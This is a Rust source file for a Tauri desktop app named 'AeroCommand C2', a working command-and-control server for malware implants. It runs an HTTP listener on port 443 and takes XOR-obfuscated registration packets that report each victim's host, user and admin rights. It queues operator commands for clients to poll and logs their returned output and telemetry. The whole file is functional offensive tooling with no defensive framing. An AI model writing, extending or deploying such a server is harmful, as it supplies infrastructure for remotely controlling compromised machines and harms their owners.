use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use std::thread;
use rusqlite::Connection;
use chrono::Local;
use tauri::State;
use base64::{engine::general_purpose, Engine as _};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Client {
    pub id: String,
    pub host: String,
    pub ip: String,
    pub pid: i32,
    pub os: String,
    pub user: String,
    pub admin: bool,
    pub first_seen: String,
    pub last_seen: String,
    pub status: String,
    pub cpu_usage: f32,
    pub ram_usage: f32,
    pub disk_usage: f32,
    pub net_usage: f32,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CommandLog {
    pub id: i32,
    pub client_id: String,
    pub command: String,
    pub output: String,
    pub timestamp: String,
    pub status: String,
}

pub struct AppState {
    pub clients: Mutex<Vec<Client>>,
    pub logs: Mutex<Vec<CommandLog>>,
    pub pending_commands: Mutex<std::collections::HashMap<String, Vec<String>>>,
}

const XOR_KEY: u8 = 0x5A;

fn xor_cipher(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b ^ XOR_KEY).collect()
}

fn decrypt_payload(raw_b64: &str) -> Option<serde_json::Value> {
    if let Ok(raw_bytes) = general_purpose::STANDARD.decode(raw_b64) {
        let decrypted = xor_cipher(&raw_bytes);
        if let Ok(json_str) = String::from_utf8(decrypted) {
            return serde_json::from_str(&json_str).ok();
        }
    }
    None
}

fn encrypt_response(json_val: serde_json::Value) -> String {
    if let Ok(json_str) = serde_json::to_string(&json_val) {
        let encrypted = xor_cipher(json_str.as_bytes());
        return general_purpose::STANDARD.encode(encrypted);
    }
    String::new()
}

fn clean_client_id(raw_id: &str, remote_ip: &str, pid: Option<i64>) -> String {
    let mut id = raw_id.replace(" ", "")
        .replace("%3A", ":")
        .replace("%2E", ".")
        .replace("%2D", "-")
        .replace("%5F", "_");
    
    if id.starts_with("unknown") {
        id = id.replace("unknown", remote_ip);
    }
    
    // If the ID still doesn't have a PID (no colon) and we have one, append it
    if !id.contains(':') {
        if let Some(p) = pid {
            if p > 0 {
                id = format!("{}:{}", id, p);
            }
        }
    }
    
    id.trim().to_string()
}

fn init_db() -> rusqlite::Result<()> {
    let conn = Connection::open("aerocommand.db")?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            host TEXT,
            ip TEXT,
            pid INTEGER,
            os TEXT,
            user TEXT,
            admin BOOLEAN,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT
        )",
        [],
    )?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            command TEXT,
            output TEXT,
            timestamp TEXT,
            status TEXT
        )",
        [],
    )?;
    Ok(())
}

#[tauri::command]
fn get_clients(state: State<Arc<AppState>>) -> Vec<Client> {
    state.clients.lock().unwrap().clone()
}

#[tauri::command]
fn get_logs(state: State<Arc<AppState>>) -> Vec<CommandLog> {
    state.logs.lock().unwrap().clone()
}

#[tauri::command]
fn send_command(client_id: String, command: String, state: State<Arc<AppState>>) -> String {
    let mut pending = state.pending_commands.lock().unwrap();
    pending.entry(client_id.clone()).or_insert(vec![]).push(command.clone());
    
    let mut logs = state.logs.lock().unwrap();
    let new_id = (logs.len() + 1) as i32;
    logs.push(CommandLog {
        id: new_id,
        client_id,
        command,
        output: "Queued...".to_string(),
        timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        status: "PENDING".to_string(),
    });

    "OK".to_string()
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let _ = init_db();

    let app_state = Arc::new(AppState {
        clients: Mutex::new(vec![]),
        logs: Mutex::new(vec![]),
        pending_commands: Mutex::new(std::collections::HashMap::new()),
    });

    let state_for_thread = Arc::clone(&app_state);
    thread::spawn(move || {
        // Use port 443 to match original server.py
        if let Ok(server) = tiny_http::Server::http("0.0.0.0:443") {
            println!("[+] AeroCommand C2 listening on port 443");
            for mut request in server.incoming_requests() {
                let url = request.url().to_string();
                let client_ip = request.remote_addr().map(|a| a.ip().to_string()).unwrap_or("0.0.0.0".to_string());
                
                println!("[*] Incoming request URL: {} from {}", url, client_ip);
                let clean_url = format!("/{}", url.trim_start_matches('/'));
                if clean_url.starts_with("/register") {
                    println!("[+] REGISTRATION PACKET RECEIVED from {}", client_ip);
                    let mut content = String::new();
                    let _ = request.as_reader().read_to_string(&mut content);
                    
                    if let Some(info) = decrypt_payload(&content) {
                        println!("[DEBUG] Decrypted Registration: {}", info);
                        let mut ip = info["ip"].as_str().unwrap_or("unknown").trim().to_string();
                        if ip == "unknown" || ip == "127.0.0.1" {
                            ip = client_ip.trim().to_string();
                        }
                        
                        let pid = info["pid"].as_i64().unwrap_or(0);
                        let raw_id = info["client_id"].as_str().unwrap_or("unknown");
                        let client_id = clean_client_id(raw_id, &ip, Some(pid));
                            
                        let mut clients = state_for_thread.clients.lock().unwrap();
                        let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        
                        println!("[+] Registering client: {} (Host: {})", client_id, info["host"].as_str().unwrap_or("Unknown"));
                        
                        if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                            c.last_seen = now;
                            c.status = "ALIVE".to_string();
                            c.pid = pid as i32;
                            c.host = info["host"].as_str().unwrap_or(&c.host).to_string();
                        } else {
                            clients.push(Client {
                                id: client_id,
                                host: info["host"].as_str().unwrap_or("Unknown").trim().to_string(),
                                ip: ip,
                                pid: pid as i32,
                                os: info["os"].as_str().unwrap_or("Unknown").trim().to_string(),
                                user: info["user"].as_str().unwrap_or("Unknown").trim().to_string(),
                                admin: info["admin"].as_bool().unwrap_or(false),
                                first_seen: now.clone(),
                                last_seen: now,
                                status: "ALIVE".to_string(),
                                cpu_usage: 0.0,
                                ram_usage: 0.0,
                                disk_usage: 0.0,
                                net_usage: 0.0,
                            });
                        }
                    } else {
                        println!("[!] FAILED TO DECRYPT registration packet from {}", client_ip);
                    }
                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                } else if clean_url.starts_with("/cmd") {
                    println!("[+] COMMAND POLL from {}", client_ip);
                    let raw_id = clean_url.split("id=").nth(1).unwrap_or("").to_string();
                    let client_id = clean_client_id(&raw_id, &client_ip, None);
                    
                    let mut response_json = serde_json::json!({});
                    let mut is_known = false;

                    if !client_id.is_empty() {
                        let mut clients = state_for_thread.clients.lock().unwrap();
                        let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                            c.last_seen = now;
                            c.status = "ALIVE".to_string();
                            is_known = true;
                        }
                    }

                    if !is_known && !client_id.is_empty() {
                        // Unknown client - tell it to re-register
                        println!("[!] Unknown client {} polling. Sending re-register request.", client_id);
                        response_json = serde_json::json!({"action": "re-register"});
                    } else if is_known {
                        let mut pending = state_for_thread.pending_commands.lock().unwrap();
                        if let Some(cmds) = pending.get_mut(&client_id) {
                            if !cmds.is_empty() {
                                response_json = serde_json::json!({"command": cmds.remove(0)});
                            }
                        }
                    }
                    
                    let encrypted = encrypt_response(response_json);
                    let _ = request.respond(tiny_http::Response::from_string(encrypted));
                } else if clean_url.starts_with("/result") {
                    println!("[+] COMMAND RESULT from {}", client_ip);
                    let mut content = String::new();
                    let _ = request.as_reader().read_to_string(&mut content);
                    
                    if let Some(data) = decrypt_payload(&content) {
                        let pid = data["pid"].as_i64();
                        let raw_id = data["client_id"].as_str().unwrap_or("unknown");
                        let client_id = clean_client_id(raw_id, &client_ip, pid);
                        let output = data["output"].as_str().unwrap_or("").to_string();
                        let mut logs = state_for_thread.logs.lock().unwrap();
                        
                        // Check if this is telemetry data
                        if let Ok(telemetry) = serde_json::from_str::<serde_json::Value>(&output) {
                            if telemetry.get("cpu").is_some() || telemetry.get("ram").is_some() {
                                let mut clients = state_for_thread.clients.lock().unwrap();
                                if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                                    c.cpu_usage = telemetry["cpu"].as_f64().unwrap_or(0.0) as f32;
                                    c.ram_usage = telemetry["ram"].as_f64().unwrap_or(0.0) as f32;
                                    c.disk_usage = telemetry["disk"].as_f64().unwrap_or(0.0) as f32;
                                    c.net_usage = telemetry["net"].as_f64().unwrap_or(0.0) as f32;
                                }
                            }
                        }

                        // Try to find the most recent PENDING log for this client to update
                        if let Some(log) = logs.iter_mut().rev().find(|l| l.client_id == client_id && l.status == "PENDING") {
                            log.output = output;
                            log.status = "SUCCESS".to_string();
                            log.timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        } else {
                            // Fallback: create new entry if no pending one found
                            let new_id = (logs.len() + 1) as i32;
                            logs.push(CommandLog {
                                id: new_id,
                                client_id,
                                command: "Result".to_string(),
                                output,
                                timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                status: "SUCCESS".to_string(),
                            });
                        }
                    }
                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                } else {
                    let _ = request.respond(tiny_http::Response::from_string("AeroCommand C2"));
                }
            }
        }
    });

    tauri::Builder::default()
        .manage(app_state)
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
